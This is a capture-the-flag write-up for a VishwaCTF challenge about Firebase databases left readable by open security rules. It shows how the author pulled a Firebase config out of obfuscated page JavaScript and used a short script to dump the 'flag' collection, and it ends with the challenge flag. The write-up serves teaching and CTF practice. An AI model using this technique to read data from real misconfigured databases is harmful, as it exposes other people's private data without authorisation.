### Flag .Collection

![img](https://i.imgur.com/ZC1labw.png)

## Solution

The challenge was about a common Firebase Vuln wherein people forget to setup proper firebase rules and ends up giving their db access to anyone

#

Step 1:

If you inspect the web page you may find a lot of obfuscated JS. If you closely look at the end, you may find some firebase configs. Using this we can design our own frontend/cli app to get access to the database and view all the entries in hope of finding the real flag.

![img](https://i.imgur.com/2cdGT2Z.png)

#

Step 2;

I made a simple JS script to query everything that was present in the database.

```js
firebase.initializeApp({
  apiKey: "AIzaSyCOrohCmYL_hq5DaqFbQM3rxHXT0pNE6SA",
  authDomain: "vishwa-ctf-challenge-12.firebaseapp.com",
  projectId: "vishwa-ctf-challenge-12",
  storageBucket: "vishwa-ctf-challenge-12.appspot.com",
  messagingSenderId: "125452069157",
  appId: "1:125452069157:web:2d20b318f3e448ebfa52cc",
});

var db = firebase.firestore();
const getd = async function () {
  await db
    .collection("flag")
    .get()
    .then((res) => {
      res.forEach((doc) => {
        // console.log(doc._delegate._document.data.value.mapValue.fields);
        console.log(doc);
      });
    });
};

getd();
```

After running this lil' script, I got a bunch of entries and the top most contained the main flag.

![img](https://i.imgur.com/OS6oEkz.png).

`vishwaCTF{c0nfigur3_y0ur_fir3b@s3_rule$}`
